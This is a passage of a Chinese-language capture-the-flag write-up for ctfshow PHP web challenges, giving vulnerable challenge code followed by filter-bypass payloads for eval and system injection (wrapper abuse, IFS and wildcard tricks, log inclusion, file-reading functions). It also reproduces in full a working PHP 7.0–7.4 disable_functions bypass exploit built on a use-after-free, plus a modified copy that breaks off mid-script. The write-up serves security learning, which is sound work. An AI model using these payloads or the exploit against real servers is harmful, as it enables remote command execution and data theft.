&#125; &#125;else&#123; highlight_file(__FILE__); &#125; payload ?c&#x3D;echo&#96;ls&#96;; ?c&#x3D;echo%09&#96;tac%09fla*&#96;;&#x2F;&#x2F;过滤了空格，但是可以用%09绕过 看hint感觉预期解应该是无参数的rce ?c&#x3D;readfile(array_rand(array_flip(scandir(current(localeconv()))))); ?c&#x3D;show_source(next(array_reverse(scandir(current(localeconv()))))); web32&lt;?php error_reporting(0); if(isset($_GET[&#39;c&#39;]))&#123; $c &#x3D; $_GET[&#39;c&#39;]; if(!preg_match(&quot;&#x2F;flag|system|php|cat|sort|shell|\\.| |\\&#39;|\\&#96;|echo|\\;|\\(&#x2F;i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__); &#125; payload ?c&#x3D;include%0a$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php &#x2F;&#x2F;php的最后一行代码可以不用分号分行 c&#x3D;?&gt;&lt;?&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64- encode&#x2F;resource&#x3D;flag.php&#x2F;&#x2F;用短标签再写段php也一样 php伪协议通常用于文件包含中，php中文件包含的函数有很多，比如 include include、require、include_once、require_once、highlight_file、show_source、file_get_contents、fopen、file、readfile 还可以用data伪协议 data伪协议就是把一些体量比较小的数据直接嵌入在页面里，而不使用外部链接。data:text/plain是嵌入文本 payload get传参 ?c&#x3D;include%0a$_POST[1]?&gt; post内容 1&#x3D;data:text&#x2F;plain,&lt;?php system(&#39;cat flag*&#39;); 官方payload c&#x3D;$nice&#x3D;include$_GET[&quot;url&quot;]?&gt;&amp;url&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64- encode&#x2F;resource&#x3D;flag.php&#x2F;&#x2F;感觉中间这个nice没啥用 web33同32 web34同32 web35同32 web36同32，就是注意不要用数字当参数名 web37&lt;?php &#x2F;&#x2F;flag in flag.php error_reporting(0); if(isset($_GET[&#39;c&#39;]))&#123; $c &#x3D; $_GET[&#39;c&#39;]; if(!preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $c))&#123; include($c); echo $flag; &#125; &#125;else&#123; highlight_file(__FILE__); &#125; 直接data伪协议读取 payload ?c&#x3D;data:text&#x2F;plain,&lt;?php system(&#39;cat fla*&#39;); web38&lt;?php &#x2F;&#x2F;flag in flag.php error_reporting(0); if(isset($_GET[&#39;c&#39;]))&#123; $c &#x3D; $_GET[&#39;c&#39;]; if(!preg_match(&quot;&#x2F;flag|php|file&#x2F;i&quot;, $c))&#123; include($c); echo $flag; &#125; &#125;else&#123; highlight_file(__FILE__); &#125; data伪协议加短标签 ?c&#x3D;data:text&#x2F;plain,&lt;?&#x3D;system(&#39;cat fla*&#39;); 至于利用日志文件的部分，不知道为什么只有用短标签的时候才能成功 首先用bp避免箭头符号的转义（这里也是只有作为c的值且用短标签的时候才会不转义，web37也一样 然后利用文件包含访问nginx的日志文件/var/log/nginx/access.log web39&lt;?php &#x2F;&#x2F;flag in flag.php error_reporting(0); if(isset($_GET[&#39;c&#39;]))&#123; $c &#x3D; $_GET[&#39;c&#39;]; if(!preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $c))&#123; include($c.&quot;.php&quot;); &#125; &#125;else&#123; highlight_file(__FILE__); &#125; 尖括号闭合掉后面的.php就行了 payload ?c&#x3D;data:text&#x2F;plain,&lt;?php system(&#39;cat fla*&#39;);?&gt; web40&lt;?php &#x2F;* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-04 00:12:34 # @Last Modified by: h1xa # @Last Modified time: 2020-09-04 06:03:36 # @email: h1xa@ctfer.com # @link: https:&#x2F;&#x2F;ctfer.com *&#x2F; if(isset($_GET[&#39;c&#39;]))&#123; $c &#x3D; $_GET[&#39;c&#39;]; if(!preg_match(&quot;&#x2F;[0-9]|\\~|\\&#96;|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\（|\\）|\\-|\\&#x3D;|\\+|\\&#123;|\\[|\\]|\\&#125;|\\:|\\&#39;|\\&quot;|\\,|\\&lt;|\\.|\\&gt;|\\&#x2F;|\\?|\\\\\\\\&#x2F;i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__); &#125; payload 可以用无参数rce，因为这里过滤的是中文的括号 ?c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv()))))); 或者利用session,但是 利用session_id()让php读取我们设置的cookie（session默认不使用所以加了session_start()让php开始使用session） 受php版本影响 5.5 -7.1.9均可以执行，因为session_id规定为0-9，a-z,A-Z,-中的字符。在5.5以下及7.1以上均无法写入除此之外的内容。但是符合要求的字符还是可以的 所以题目环境能做到的也就只有个ls和whoami之类的命令 本来还可以利用base64，但是题目把数字也过滤了，不能进行解码，只能用本地环境复现了 我这里直接贴了其他师傅的图片了 还有一种姿势 get_defined_vars() 返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。 array_pop() 是删除并返回数组最后一个元素 current() 返回数组中的当前元素的值。 next() 返回数组中的下一个元素的值。 我们用current()可以获取到GET数组，用next()可以获取到POST数组，然后用array_pop()取出POST数组里面的元素，最后用eval执行 web41或运算绕过，直接用羽师傅的脚本也行。 不过要是直接输payload要在bp里，应该是hackbar的编码有点问题 web42&lt;?php if(isset($_GET[&#39;c&#39;]))&#123; $c&#x3D;$_GET[&#39;c&#39;]; system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;); &#125;else&#123; highlight_file(__FILE__); &#125; &gt; 代表重定向到哪里/dev/null 代表空设备文件2&gt; 表示stderr标准错误&amp; 表示等同于的意思，2&gt;&amp;1，表示2的输出重定向等同于11 表示stdout标准输出，系统默认值是1，所以&gt;/dev/null等同于 1&gt;/dev/null因此，&gt;/dev/null 2&gt;&amp;1 也可以写成1&gt; /dev/null 2&gt; &amp;1 本题语句执行过程为：1&gt;/dev/null ：首先表示标准输出重定向到空设备文件，也就是不输出任何信息到终端，不显示任何信息。2&gt;&amp;1 ： 接着，标准错误输出重定向到标准输出，因为之前标准输出已经重定向到了空设备文件，所以标准错误输出也重定向到空设备文件。 补充：0表示键盘输入，1表示屏幕输出，2表示错误输出！‘ &gt; ’ 默认标准输出重定向，与1&gt;相同2&gt;&amp;1 意思是把标准错误输出重定向到标准输出&amp;&gt;file 意思是把标准输出和标准错误输出都重定向到文件file中 利用%0a换行把它换下去或者其他的语句来截断 ?c&#x3D;cat flag.php%0a ?c&#x3D;cat flag.php|| ?c&#x3D;cat flag.php%26 ?c&#x3D;cat flag.php%26%26 ?c&#x3D;cat flag.php; web43&lt;?php if(isset($_GET[&#39;c&#39;]))&#123; $c&#x3D;$_GET[&#39;c&#39;]; if(!preg_match(&quot;&#x2F;\\;|cat&#x2F;i&quot;, $c))&#123; system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;); &#125; &#125;else&#123; highlight_file(__FILE__); &#125; payload基本上和42的一样，就是把cat换成uniq，tac，nl之类的 web44&lt;?php if(isset($_GET[&#39;c&#39;]))&#123; $c&#x3D;$_GET[&#39;c&#39;]; if(!preg_match(&quot;&#x2F;;|cat|flag&#x2F;i&quot;, $c))&#123; system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;); &#125; &#125;else&#123; highlight_file(__FILE__); &#125; flag也被过滤了，那就在web43的基础上加上通配符 web45空格也被过滤了 &lt;?php if(isset($_GET[&#39;c&#39;]))&#123; $c&#x3D;$_GET[&#39;c&#39;]; if(!preg_matchd(&quot;&#x2F;\\;|cat|flag| &#x2F;i&quot;, $c))&#123; system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;); &#125; &#125;else&#123; highlight_file(__FILE__); &#125; 用${IFS}替代空格 c&#x3D;nl$&#123;IFS&#125;f*|| web46-51&lt;?php if(isset($_GET[&#39;c&#39;]))&#123; $c&#x3D;$_GET[&#39;c&#39;]; if(!preg_match(&quot;&#x2F;\\;|cat|flag| |[0-9]|\\\\$|\\*&#x2F;i&quot;, $c))&#123; system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;); &#125; &#125;else&#123; highlight_file(__FILE__); &#125; 用&lt;或&lt;&gt;代替空格，用‘’截断flag关键字 c&#x3D;nl&lt;&gt;fla&#39;&#39;g.php|| web47 和46一样的 nl&lt;&gt;fla&#39;&#39;g.php|| web48 同46 more:一页一页的显示档案内容 less:与 more 类似 head:查看头几行 tac:从最后一行开始显示，可以看出 tac 是cat 的反向显示 tail:查看尾几行 nl：显示的时候，顺便输出行号 od:以二进制的方式读取档案内容 vi:一种编辑器，这个也可以查看 vim:一种编辑器，这个也可以查看 sort:可以查看 uniq:可以查看 file -f:报错出具体内容 grep:在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep test *file strings web49 同46 这个也行 ?c&#x3D;nl%09fl&quot;&quot;ag.php%0a web50 同46 web51 同46 web52过滤了大于小于，但是没过滤$符 ?c&#x3D;nl$&#123;IFS&#125;fla&#39;&#39;g.php|| web53&lt;?php if(isset($_GET[&#39;c&#39;]))&#123; $c&#x3D;$_GET[&#39;c&#39;]; if(!preg_match(&quot;&#x2F;\\;|cat|flag| |[0-9]|\\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\&#96;|\\%|\\x09|\\x26|\\&gt;|\\&lt;&#x2F;i&quot;, $c))&#123; echo($c); $d &#x3D; system($c); echo &quot;&lt;br&gt;&quot;.$d; &#125;else&#123; echo &#39;no&#39;; &#125; &#125;else&#123; highlight_file(__FILE__); &#125; payload ?c&#x3D;nl$&#123;IFS&#125;fla&#39;&#39;g.php web54&lt;?php if(isset($_GET[&#39;c&#39;]))&#123; $c&#x3D;$_GET[&#39;c&#39;]; if(!preg_match(&quot;&#x2F;\\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\\&#96;|\\%|\\x09|\\x26|\\&gt;|\\&lt;&#x2F;i&quot;, $c))&#123; system($c); &#125; &#125;else&#123; highlight_file(__FILE__); &#125; payload ?c&#x3D;&#x2F;bin&#x2F;ca?$&#123;IFS&#125;f??????? 通配符绕过 web55&lt;?php if(isset($_GET[&#39;c&#39;]))&#123; $c&#x3D;$_GET[&#39;c&#39;]; if(!preg_match(&quot;&#x2F;\\;|[a-z]|\\&#96;|\\%|\\x09|\\x26|\\&gt;|\\&lt;&#x2F;i&quot;, $c))&#123; system($c); &#125; &#125;else&#123; highlight_file(__FILE__); &#125; payload1 利用base64命令和通配符 c&#x3D;&#x2F;???&#x2F;????64 ????.??? payload2 p牛是真的厉害 https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=1#reply-list 直接利用p牛博客里的这个 然后cat flag.php 有几率不成功，因为临时文件的文件名是随机的，如果没成功就是没大写，多试几次就行了 web56 另外这里如果是eval函数，那执行时还要加上?&gt;&lt;?= payload为 ?&gt;&lt;?&#x3D;&#96;. &#x2F;???&#x2F;????????[@-[]&#96;;?&gt; 原因是eval()函数相当于执行php的代码，而&lt;?= 就相当于&lt;?php echo 在PHP7以上不管short_open_tag配置是不是开启的。都可以使用。所以就相当于一个新的PHP文件，这样的话就需要将最开始前面的&lt;?php给闭合，不然不会执行。 web57&lt;?php &#x2F;&#x2F; 还能炫的动吗？ &#x2F;&#x2F;flag in 36.php if(isset($_GET[&#39;c&#39;]))&#123; $c&#x3D;$_GET[&#39;c&#39;]; if(!preg_match(&quot;&#x2F;\\;|[a-z]|[0-9]|\\&#96;|\\|\\#|\\&#39;|\\&quot;|\\&#96;|\\%|\\x09|\\x26|\\x0a|\\&gt;|\\&lt;|\\.|\\,|\\?|\\*|\\-|\\&#x3D;|\\[&#x2F;i&quot;, $c))&#123; system(&quot;cat &quot;.$c.&quot;.php&quot;); &#125; &#125;else&#123; highlight_file(__FILE__); &#125; $&#123;_&#125;:代表上一次命令执行的结果$(()): 做运算 之前没有命令返回或者执行,结果应该是空,与&quot;&quot;等价又 $((&quot;&quot;))值为0,$((~$((&quot;&quot;))))值为-1,再做拼接: payload $((~$(($((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;)))))))) web58-65有一堆禁用函数 print_r(scandir(&#39;.&#39;));或者print_r(glob(&quot;*&quot;));读目录 扫目录找flag位置 print_r(scandir(&#39;./&#39;)); $a=opendir(&#39;./&#39;);while(($file = readdir($a)) !=false){echo $file.&quot; &quot;;} var_dump(scandir(&quot;/&quot;)); $a=new DirectoryIterator(&#39;glob:///*&#39;);foreach($a as $f){echo($f-&gt;__toString().&quot; &quot;);} c=print_r(file_get_contents(&#39;flag.php&#39;));或者readfile或者show_source或者highlight_file读文件 还可以更骚一点 POST c=include($_GET[&#39;url&#39;]); GET /?url=php://filter/read=convert.base64-encode/resource=flag.php 附一点读文件的方式 highlight_file($filename); show_source($filename); print_r(php_strip_whitespace($filename)); print_r(file_get_contents($filename)); readfile($filename); print_r(file($filename)); &#x2F;&#x2F; var_dump fread(fopen($filename,&quot;r&quot;), $size);&#x2F;&#x2F;print_r(fread(fopen(&quot;flag.php&quot;,&quot;r&quot;), filesize(&quot;flag.php&quot;))); include($filename); &#x2F;&#x2F; 非php代码 include_once($filename); &#x2F;&#x2F; 非php代码 require($filename); &#x2F;&#x2F; 非php代码 require_once($filename); &#x2F;&#x2F; 非php代码 伪协议读源码 print_r(fread(popen(&quot;cat flag&quot;, &quot;r&quot;), $size)); print_r(fgets(fopen($filename, &quot;r&quot;))); &#x2F;&#x2F; 读取一行$a&#x3D;fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line &#x3D; fgets($a);echo $line;&#125; fpassthru(fopen($filename, &quot;r&quot;)); &#x2F;&#x2F; 从当前位置一直读取到 EOF print_r(fgetcsv(fopen($filename,&quot;r&quot;), $size));&#x2F;&#x2F;fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line &#x3D; fgetcsv($a);var_dump($line);&#125; print_r(fgetss(fopen($filename, &quot;r&quot;))); &#x2F;&#x2F; 从文件指针中读取一行并过滤掉 HTML 标记 print_r(fscanf(fopen(&quot;flag&quot;, &quot;r&quot;),&quot;%s&quot;));&#x2F;&#x2F;c&#x3D;$a&#x3D;fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;print_r(fscanf($a,&quot;%s&quot;));&#125;; print_r(parse_ini_file($filename)); &#x2F;&#x2F; 失败时返回 false , 成功返回配置数组 web59 file_get_contents和readfile没了，可以用其他俩 web60-65 同web58，差不多就那几个函数，用show_source能全过 web66c&#x3D;print_r(scandir(&#39;&#x2F;&#39;));highlight_file(&quot;&#x2F;flag.txt&quot;); web67print_r禁了 用var_dump c&#x3D;var_dump(scandir(&#39;&#x2F;&#39;));highlight_file(&quot;&#x2F;flag.txt&quot;); web68c&#x3D;var_dump(scandir(&#39;&#x2F;&#39;));include(&quot;&#x2F;flag.txt&quot;) 看根目录，然后直接include包含 web69var_dump也没了，但是还有var_export c&#x3D;var_export(scandir(&#39;&#x2F;&#39;));include(&quot;&#x2F;flag.txt&quot;); y4师傅还有一个用php的原生类遍历目录的骚操作 c&#x3D;$a&#x3D;new DirectoryIterator(&#39;glob:&#x2F;&#x2F;&#x2F;*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125; 然后包含这个我文件 c&#x3D;include(&#39;&#x2F;flag.txt&#39;); c&#x3D;require(&#39;&#x2F;flag.txt&#39;); c&#x3D;require_once(&#39;&#x2F;flag.txt&#39;); web70同69 web71&lt;?php error_reporting(0); ini_set(&#39;display_errors&#39;, 0); &#x2F;&#x2F; 你们在炫技吗？ if(isset($_POST[&#39;c&#39;]))&#123; $c&#x3D; $_POST[&#39;c&#39;]; eval($c); $s &#x3D; ob_get_contents(); ob_end_clean(); echo preg_replace(&quot;&#x2F;[0-9]|[a-z]&#x2F;i&quot;,&quot;?&quot;,$s); &#125;else&#123; highlight_file(__FILE__); &#125; ?&gt; ob_get_contents — 返回输出缓冲区的内容ob_end_clean — 清空（擦除）缓冲区并关闭输出缓冲 此函数丢弃最顶层输出缓冲区的内容并关闭这个缓冲区。如果想要进一步处理缓冲区的内容，必须在ob_end_clean()之前调用ob_get_contents()，因为当调用ob_end_clean()时缓冲区内容将被丢弃 要用exit();使程序提前退出，绕过后面的正则表达式 c&#x3D;var_export(scandir(&#39;&#x2F;&#39;));include(&quot;&#x2F;flag.txt&quot;);exit(); web72scandir被禁用了 用y4师傅的那个原生类来查目录，但是文件没有权限被包含 y4师傅推荐的脚本 &lt;?php # PHP 7.0-7.4 disable_functions bypass PoC (*nix only) # # Bug: https:&#x2F;&#x2F;bugs.php.net&#x2F;bug.php?id&#x3D;76047 # debug_backtrace() returns a reference to a variable # that has been destroyed, causing a UAF vulnerability. # # This exploit should work on all PHP 7.0-7.4 versions # released as of 30&#x2F;01&#x2F;2020. # # Author: https:&#x2F;&#x2F;github.com&#x2F;mm0r1 pwn(&quot;uname -a&quot;); function pwn($cmd) &#123; global $abc, $helper, $backtrace; class Vuln &#123; public $a; public function __destruct() &#123; global $backtrace; unset($this-&gt;a); $backtrace &#x3D; (new Exception)-&gt;getTrace(); # ;) if(!isset($backtrace[1][&#39;args&#39;])) &#123; # PHP &gt;&#x3D; 7.4 $backtrace &#x3D; debug_backtrace(); &#125; &#125; &#125; class Helper &#123; public $a, $b, $c, $d; &#125; function str2ptr(&amp;$str, $p &#x3D; 0, $s &#x3D; 8) &#123; $address &#x3D; 0; for($j &#x3D; $s-1; $j &gt;&#x3D; 0; $j--) &#123; $address &lt;&lt;&#x3D; 8; $address |&#x3D; ord($str[$p+$j]); &#125; return $address; &#125; function ptr2str($ptr, $m &#x3D; 8) &#123; $out &#x3D; &quot;&quot;; for ($i&#x3D;0; $i &lt; $m; $i++) &#123; $out .&#x3D; chr($ptr &amp; 0xff); $ptr &gt;&gt;&#x3D; 8; &#125; return $out; &#125; function write(&amp;$str, $p, $v, $n &#x3D; 8) &#123; $i &#x3D; 0; for($i &#x3D; 0; $i &lt; $n; $i++) &#123; $str[$p + $i] &#x3D; chr($v &amp; 0xff); $v &gt;&gt;&#x3D; 8; &#125; &#125; function leak($addr, $p &#x3D; 0, $s &#x3D; 8) &#123; global $abc, $helper; write($abc, 0x68, $addr + $p - 0x10); $leak &#x3D; strlen($helper-&gt;a); if($s !&#x3D; 8) &#123; $leak %&#x3D; 2 &lt;&lt; ($s * 8) - 1; &#125; return $leak; &#125; function parse_elf($base) &#123; $e_type &#x3D; leak($base, 0x10, 2); $e_phoff &#x3D; leak($base, 0x20); $e_phentsize &#x3D; leak($base, 0x36, 2); $e_phnum &#x3D; leak($base, 0x38, 2); for($i &#x3D; 0; $i &lt; $e_phnum; $i++) &#123; $header &#x3D; $base + $e_phoff + $i * $e_phentsize; $p_type &#x3D; leak($header, 0, 4); $p_flags &#x3D; leak($header, 4, 4); $p_vaddr &#x3D; leak($header, 0x10); $p_memsz &#x3D; leak($header, 0x28); if($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 6) &#123; # PT_LOAD, PF_Read_Write # handle pie $data_addr &#x3D; $e_type &#x3D;&#x3D; 2 ? $p_vaddr : $base + $p_vaddr; $data_size &#x3D; $p_memsz; &#125; else if($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 5) &#123; # PT_LOAD, PF_Read_exec $text_size &#x3D; $p_memsz; &#125; &#125; if(!$data_addr || !$text_size || !$data_size) return false; return [$data_addr, $text_size, $data_size]; &#125; function get_basic_funcs($base, $elf) &#123; list($data_addr, $text_size, $data_size) &#x3D; $elf; for($i &#x3D; 0; $i &lt; $data_size &#x2F; 8; $i++) &#123; $leak &#x3D; leak($data_addr, $i * 8); if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123; $deref &#x3D; leak($leak); # &#39;constant&#39; constant check if($deref !&#x3D; 0x746e6174736e6f63) continue; &#125; else continue; $leak &#x3D; leak($data_addr, ($i + 4) * 8); if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123; $deref &#x3D; leak($leak); # &#39;bin2hex&#39; constant check if($deref !&#x3D; 0x786568326e6962) continue; &#125; else continue; return $data_addr + $i * 8; &#125; &#125; function get_binary_base($binary_leak) &#123; $base &#x3D; 0; $start &#x3D; $binary_leak &amp; 0xfffffffffffff000; for($i &#x3D; 0; $i &lt; 0x1000; $i++) &#123; $addr &#x3D; $start - 0x1000 * $i; $leak &#x3D; leak($addr, 0, 7); if($leak &#x3D;&#x3D; 0x10102464c457f) &#123; # ELF header return $addr; &#125; &#125; &#125; function get_system($basic_funcs) &#123; $addr &#x3D; $basic_funcs; do &#123; $f_entry &#x3D; leak($addr); $f_name &#x3D; leak($f_entry, 0, 6); if($f_name &#x3D;&#x3D; 0x6d6574737973) &#123; # system return leak($addr + 8); &#125; $addr +&#x3D; 0x20; &#125; while($f_entry !&#x3D; 0); return false; &#125; function trigger_uaf($arg) &#123; # str_shuffle prevents opcache string interning $arg &#x3D; str_shuffle(str_repeat(&#39;A&#39;, 79)); $vuln &#x3D; new Vuln(); $vuln-&gt;a &#x3D; $arg; &#125; if(stristr(PHP_OS, &#39;WIN&#39;)) &#123; die(&#39;This PoC is for *nix systems only.&#39;); &#125; $n_alloc &#x3D; 10; # increase this value if UAF fails $contiguous &#x3D; []; for($i &#x3D; 0; $i &lt; $n_alloc; $i++) $contiguous[] &#x3D; str_shuffle(str_repeat(&#39;A&#39;, 79)); trigger_uaf(&#39;x&#39;); $abc &#x3D; $backtrace[1][&#39;args&#39;][0]; $helper &#x3D; new Helper; $helper-&gt;b &#x3D; function ($x) &#123; &#125;; if(strlen($abc) &#x3D;&#x3D; 79 || strlen($abc) &#x3D;&#x3D; 0) &#123; die(&quot;UAF failed&quot;); &#125; # leaks $closure_handlers &#x3D; str2ptr($abc, 0); $php_heap &#x3D; str2ptr($abc, 0x58); $abc_addr &#x3D; $php_heap - 0xc8; # fake value write($abc, 0x60, 2); write($abc, 0x70, 6); # fake reference write($abc, 0x10, $abc_addr + 0x60); write($abc, 0x18, 0xa); $closure_obj &#x3D; str2ptr($abc, 0x20); $binary_leak &#x3D; leak($closure_handlers, 8); if(!($base &#x3D; get_binary_base($binary_leak))) &#123; die(&quot;Couldn&#39;t determine binary base address&quot;); &#125; if(!($elf &#x3D; parse_elf($base))) &#123; die(&quot;Couldn&#39;t parse ELF header&quot;); &#125; if(!($basic_funcs &#x3D; get_basic_funcs($base, $elf))) &#123; die(&quot;Couldn&#39;t get basic_functions address&quot;); &#125; if(!($zif_system &#x3D; get_system($basic_funcs))) &#123; die(&quot;Couldn&#39;t get zif_system address&quot;); &#125; # fake closure object $fake_obj_offset &#x3D; 0xd0; for($i &#x3D; 0; $i &lt; 0x110; $i +&#x3D; 8) &#123; write($abc, $fake_obj_offset + $i, leak($closure_obj, $i)); &#125; # pwn write($abc, 0x20, $abc_addr + $fake_obj_offset); write($abc, 0xd0 + 0x38, 1, 4); # internal func type write($abc, 0xd0 + 0x68, $zif_system); # internal func handler ($helper-&gt;b)($cmd); exit(); &#125; pwn(&quot;cat &#x2F;flag0.txt&quot;);ob_end_flush(); //上边这个脚本过不了的原因是题目环境禁用了str_repeat，所以手动重复79个A就行了 群主给的 c&#x3D;function ctfshow($cmd) &#123; global $abc, $helper, $backtrace; class Vuln &#123; public $a; public function __destruct() &#123; global $backtrace; unset($this-&gt;a); $backtrace &#x3D; (new Exception)-&gt;getTrace(); if(!isset($backtrace[1][&#39;args&#39;])) &#123; $backtrace &#x3D; debug_backtrace(); &#125; &#125; &#125; class Helper &#123; public $a, $b, $c, $d; &#125; function str2ptr(&amp;$str, $p &#x3D; 0, $s &#x3D; 8) &#123; $address &#x3D; 0; for($j &#x3D; $s-1; $j &gt;&#x3D; 0; $j--) &#123; $address &lt;&lt;&#x3D; 8; $address |&#x3D; ord($str[$p+$j]); &#125; return $address; &#125; function ptr2str($ptr, $m &#x3D; 8) &#123; $out &#x3D; &quot;&quot;; for ($i&#x3D;0; $i &lt; $m; $i++) &#123; $out .&#x3D; sprintf(&quot;%c&quot;,($ptr &amp; 0xff)); $ptr &gt;&gt;&#x3D; 8; &#125; return $out; &#125; function write(&amp;$str, $p, $v, $n &#x3D; 8) &#123; $i &#x3D; 0; for($i &#x3D; 0; $i &lt; $n; $i++) &#123; $str[$p + $i] &#x3D; sprintf(&quot;%c&quot;,($v &amp; 0xff)); $v &gt;&gt;&#x3D; 8; &#125; &#125; function leak($addr, $p &#x3D; 0, $s &#x3D; 8) &#123; global $abc, $helper; write($abc, 0x68, $addr + $p - 0x10); $leak &#x3D; strlen($helper-&gt;a); if($s !&#x3D; 8) &#123; $leak %&#x3D; 2 &lt;&lt; ($s * 8) - 1; &#125; return $leak; &#125; function parse_elf($base) &#123; $e_type &#x3D; leak($base, 0x10, 2); $e_phoff &#x3D; leak($base, 0x20); $e_phentsize &#x3D; leak($base, 0x36, 2); $e_phnum &#x3D; leak($base, 0x38, 2); for($i &#x3D; 0; $i &lt; $e_phnum; $i++) &#123; $header &#x3D; $base + $e_phoff + $i * $e_phentsize; $p_type &#x3D; leak($header, 0, 4); $p_flags &#x3D; leak($header, 4, 4); $p_vaddr &#x3D; leak($header, 0x10); $p_memsz &#x3D; leak($header, 0x28); if($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 6) &#123; $data_addr &#x3D; $e_type &#x3D;&#x3D; 2 ? $p_vaddr : $base + $p_vaddr; $data_size &#x3D; $p_memsz; &#125; else if($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 5) &#123; $text_size &#x3D; $p_memsz; &#125; &#125; if(!$data_addr || !$text_size || !$data_size) return false; return [$data_addr, $text_size, $data_size]; &#125; function get_basic_funcs($base, $elf) &#123; list($data_addr, $text_size, $data_size) &#x3D; $elf; for($i &#x3D; 0; $i &lt; $data_size &#x2F; 8; $i++) &#123; $leak &#x3D; leak($data_addr, $i * 8); if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123; $deref &#x3D; leak($leak); if($deref !&#x3D; 0x746e6174736e6f63) continue; &#125; else continue; $leak &#x3D; leak($data_addr, ($i + 4) * 8); if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123; $deref &#x3D; leak($leak); if($deref !&#x3D; 0x786568326e6962) continue; &#125; else continue; return $data_addr + $i * 8; &#125; &#125; function get_binary_base($binary_leak) &#123; $base &#x3D; 0; $start &#x3D; $binary_leak &amp; 0xfffffffffffff000; for($i &#x3D; 0; $i &lt; 0x1000; $i++) &#123; $addr &#x3D; $start - 0x1000 * $i; $leak &#x3D; leak($addr, 0, 7); if($leak &#x3D;&#x3D; 0x10102464c457f) &#123; return $addr; &#125; &#125; &#125; function get_system($basic_funcs) &#123; $addr &#x3D; $basic_funcs; do &#123; $f_entry &#x3D; leak($addr); $f_name &#x3D; leak($f_entry, 0, 6); if($f_name &#x3D;&#x3D; 0x6d6574737973) &#123; return leak($addr + 8); &#125; $addr +&#x3D; 0x20; &#125; while($f_entry !&#x3D; 0); return false; &#125; function trigger_uaf($arg) &#123; $arg &#x3D; str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;); $vuln &#x3D; new Vuln(); $vuln-&gt;a &#x3D; $arg; &#125; if(stristr(PHP_OS, &#39;WIN&#39;)) &#123; die(&#39;This PoC is for *nix systems only.&#39;); &#125; $n_alloc &#x3D; 10; $contiguous &#x3D; []; for($i &#x3D; 0; $i &lt; $n_alloc; $i++) $contiguous[] &#x3D; 